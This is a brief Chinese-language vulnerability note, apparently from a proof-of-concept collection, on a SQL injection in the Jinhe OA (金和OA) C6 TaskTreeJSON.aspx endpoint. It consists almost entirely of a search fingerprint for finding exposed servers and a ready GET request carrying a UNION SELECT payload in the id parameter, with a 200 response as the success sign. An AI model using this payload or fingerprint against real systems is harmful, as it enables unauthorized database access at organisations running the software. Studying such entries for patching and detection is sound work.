# 金和OAC6TaskTreeJSON.aspx存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`GET /C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=1%27+union+all+select+null%2C%28select+@@VERSION%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--+ HTTP/1.1`
- **响应特征**：200